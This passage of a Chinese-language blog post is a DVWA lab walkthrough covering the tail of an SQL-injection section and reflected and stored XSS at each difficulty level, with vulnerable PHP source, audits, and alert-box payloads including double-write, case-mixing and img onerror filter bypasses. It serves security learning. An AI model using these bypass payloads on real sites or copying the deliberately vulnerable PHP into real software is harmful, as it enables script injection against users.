class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">            // Get results </span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == 1 ) &#123; </span><br><span class="line">                // Feedback <span class="keyword">for</span> end user </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">                header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line">    </span><br><span class="line">                // Feedback <span class="keyword">for</span> end user </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    // Generate Anti-CSRF token </span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="审计-20"><a href="#审计-20" class="headerlink" title="审计"></a>审计</h3><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>经过后端，不经过数据库</p>
<h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-21"><a href="#审计-21" class="headerlink" title="审计"></a>审计</h4><p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p>
<h4 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，</span><br></pre></td></tr></table></figure>
<p>成功弹框：<br><img src="xss01.png" alt=""></p>
<h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="comment">// Is there any input? </span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h4 id="审计-22"><a href="#审计-22" class="headerlink" title="审计"></a>审计</h4><p>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。</p>
<h4 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>双写绕过</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&lt;sc&lt;script&gt;ript&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>成功弹框：<br><img src="xss01.png" alt=""></p>
<ul>
<li>大小写混淆绕过</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&lt;ScRipt&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，成功弹框：</span><br></pre></td></tr></table></figure>
<p><img src="xss01.png" alt=""></p>
<h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); </span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Hello <span class="variable">$&#123;name&#125;</span>&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-23"><a href="#审计-23" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p>
<h4 id="漏洞利用-18"><a href="#漏洞利用-18" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<p>输入</p>
<pre><code>&lt;img src=1 onerro r=aler\t(/给你试下xss攻击/)&gt;
</code></pre><p>成功弹框：<br><img src="xss01.png" alt=""></p>
<h3 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); </span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Hello <span class="variable">$&#123;name&#125;</span>&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-24"><a href="#审计-24" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>经过后端，经过数据库    </p>
<h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-25"><a href="#审计-25" class="headerlink" title="审计"></a>审计</h4><p>相关函数介绍</p>
<p>trim(string,charlist)</p>
<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p>mysql_real_escape_string(string,connection)</p>
<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p>stripslashes(string)</p>
<p>函数删除字符串中的反斜杠。</p>
<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
<h4 id="漏洞利用-19"><a href="#漏洞利用-19" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>message一栏输入</p>
<pre><code>&lt;script【】&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，
</code></pre><p>成功弹框：</p>
<p>name一栏前端有字数限制，直接改前端的maxlength，可以绕过，改为<script>alert(/name/)</script>：</p>
<h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-26"><a href="#审计-26" class="headerlink" title="审计"></a>审计</h4><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</b></p>
<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p>
<h4 id="漏洞利用-20"><a href="#漏洞利用-20" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>双写绕过<br>前端改maxlength限制，在name中输入&lt;sc<script>ript&gt;alert(/xss/)</script>:
<li><p>大小写混淆绕过<br>前端改maxlength限制改name参数为</p>
<p>  &lt;Script【】&gt;alert(/xss/):</p>
</li>

</p><h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-27"><a href="#审计-27" class="headerlink" title="审计"></a>审计</h4><p>使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数上述级别的<br>修改前端限制输入name为</p>
<pre><code>&lt;img src=1 onerror=alert(1)&gt;
</code></pre><h3 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">':message'</span>, <span class="variable">$message</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">':name'</span>, <span class="variable">$name</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-28"><a href="#审计-28" class="headerlink" title="审计"></a>审计</h4><p>通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS</p>
</script></p></div><div class="tags"></div><div class="post-nav"><a class="pre" href="/2018/03/16/利用python进行数据分析/">利用python进行数据分析</a><a class="next" href="/2018/01/31/OWASPTop2017笔记/">OWASPTop2017笔记</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://blog.xhzyxed.cn"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/408/">408</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Redis/">Redis</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/memcached/">memcached</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vuejs/">vuejs</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端构建工具/">前端构建工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/推文/">推文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/项目/">项目</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/mysql优化之btree索引/">mysql优化之btree索引</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/mysql优化之类型的选择/">mysql优化之类型的选择</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/mysql优化之mysql进程状态/">mysql优化之mysql进程状态</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/mysql优化之mysql-status的周期变化/">mysql优化之mysql status的周期变化</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/编译安装mysql/">编译安装mysql以及安装sysbench</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/22/408基础/">计算机基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/17/resume/">resume</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/14/php核心学习-设计模式的学习-简单工厂模式以及改进的工厂模式/">php核心学习-设计模式的学习-简单工厂模式以及改进的工厂模式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/14/php核心学习-设计模式的学习-单例模式/">php核心学习-设计模式的学习-单例模式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/13/Linux学习之进程管理/">Linux学习之进程管理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://org.xhzyxed.cn/" title="小猴子与小耳朵" target="_blank">小猴子与小耳朵</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">其斤.匕禾页.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>